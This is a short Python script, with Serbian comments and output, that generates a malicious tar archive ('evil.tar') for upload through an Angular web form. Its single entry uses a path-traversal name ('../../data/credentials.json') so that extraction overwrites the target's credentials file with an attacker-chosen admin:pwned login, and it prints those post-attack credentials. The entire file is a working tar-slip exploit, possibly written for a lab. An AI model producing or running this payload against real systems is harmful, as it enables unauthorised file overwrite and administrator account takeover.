"""Generise evil.tar za rucni upload kroz Angular formu."""

import io
import json
import tarfile
from pathlib import Path

OUTPUT = Path(__file__).resolve().parent / "payloads" / "evil.tar"
TRAVERSAL = "../../data/credentials.json"
USERNAME = "admin"
PASSWORD = "pwned"

payload = json.dumps({"username": USERNAME, "password": PASSWORD}, indent=2).encode()
buffer = io.BytesIO()

with tarfile.open(fileobj=buffer, mode="w") as tar:
    info = tarfile.TarInfo(name=TRAVERSAL)
    info.size = len(payload)
    tar.addfile(info, io.BytesIO(payload))

OUTPUT.parent.mkdir(parents=True, exist_ok=True)
OUTPUT.write_bytes(buffer.getvalue())

print(f"Sacuvano: {OUTPUT}")
print(f"Entry: {TRAVERSAL}")
print(f"Kredencijali posle napada: {USERNAME}:{PASSWORD}")
